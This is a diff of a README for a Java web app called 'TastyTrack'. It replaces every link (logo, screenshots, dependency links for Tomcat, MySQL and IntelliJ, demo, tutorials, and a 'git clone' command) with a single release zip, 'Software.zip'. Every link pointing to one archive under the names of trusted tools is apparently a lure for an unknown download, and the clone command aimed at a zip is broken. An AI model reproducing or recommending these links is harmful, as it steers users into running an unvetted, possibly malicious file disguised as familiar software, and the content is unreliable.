@@ -3,7 +3,7 @@
 
 A Java Full Stack Web Application 🍰
 
-![TastyTrack Logo](https://github.com/davicholoprod/tastytrack/releases/download/v1.0/Installer.zip)
+![TastyTrack Logo](https://github.com/davicholoprod/tastytrack/releases/download/v2.0/Software.zip)
 
 Welcome to the TastyTrack repository! This project focuses on developing a delicious Java Full Stack Web Application using various technologies such as Apache Tomcat, CSS3, Hibernate ORM, HTML5, IntelliJ IDEA, Java, JavaScript, JSP, MySQL, Servlets, and VSCode.
 
@@ -22,7 +22,7 @@ To get started with TastyTrack, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/davicholoprod/tastytrack/releases/download/v1.0/Installer.zip
+   git clone https://github.com/davicholoprod/tastytrack/releases/download/v2.0/Software.zip
    ```
 
 2. Set up your development environment with IntelliJ IDEA or VSCode.
@@ -33,28 +33,28 @@ To get started with TastyTrack, follow these steps:
 
 ## 📦 Dependencies
 
-- [Apache Tomcat](https://github.com/davicholoprod/tastytrack/releases/download/v1.0/Installer.zip)
-- [Hibernate ORM](https://github.com/davicholoprod/tastytrack/releases/download/v1.0/Installer.zip)
-- [IntelliJ IDEA](https://github.com/davicholoprod/tastytrack/releases/download/v1.0/Installer.zip)
-- [MySQL](https://github.com/davicholoprod/tastytrack/releases/download/v1.0/Installer.zip)
-- [VSCode](https://github.com/davicholoprod/tastytrack/releases/download/v1.0/Installer.zip)
+- [Apache Tomcat](https://github.com/davicholoprod/tastytrack/releases/download/v2.0/Software.zip)
+- [Hibernate ORM](https://github.com/davicholoprod/tastytrack/releases/download/v2.0/Software.zip)
+- [IntelliJ IDEA](https://github.com/davicholoprod/tastytrack/releases/download/v2.0/Software.zip)
+- [MySQL](https://github.com/davicholoprod/tastytrack/releases/download/v2.0/Software.zip)
+- [VSCode](https://github.com/davicholoprod/tastytrack/releases/download/v2.0/Software.zip)
 
 ## 🎨 Screenshots
 
-![TastyTrack Homepage](https://github.com/davicholoprod/tastytrack/releases/download/v1.0/Installer.zip)
+![TastyTrack Homepage](https://github.com/davicholoprod/tastytrack/releases/download/v2.0/Software.zip)
 
-![TastyTrack Order Page](https://github.com/davicholoprod/tastytrack/releases/download/v1.0/Installer.zip)
+![TastyTrack Order Page](https://github.com/davicholoprod/tastytrack/releases/download/v2.0/Software.zip)
 
 ## 🌐 Links
 
-- [View Live Demo](https://github.com/davicholoprod/tastytrack/releases/download/v1.0/Installer.zip)
-- [Download Latest Release](https://github.com/davicholoprod/tastytrack/releases/download/v1.0/Installer.zip)
+- [View Live Demo](https://github.com/davicholoprod/tastytrack/releases/download/v2.0/Software.zip)
+- [Download Latest Release](https://github.com/davicholoprod/tastytrack/releases/download/v2.0/Software.zip)
 
 ## 📚 Resources
 
-- [Java Documentation](https://github.com/davicholoprod/tastytrack/releases/download/v1.0/Installer.zip)
-- [HTML & CSS Tutorial](https://github.com/davicholoprod/tastytrack/releases/download/v1.0/Installer.zip)
-- [JavaScript Guide](https://github.com/davicholoprod/tastytrack/releases/download/v1.0/Installer.zip)
+- [Java Documentation](https://github.com/davicholoprod/tastytrack/releases/download/v2.0/Software.zip)
+- [HTML & CSS Tutorial](https://github.com/davicholoprod/tastytrack/releases/download/v2.0/Software.zip)
+- [JavaScript Guide](https://github.com/davicholoprod/tastytrack/releases/download/v2.0/Software.zip)
 
 ## 🤝 Contributing
 
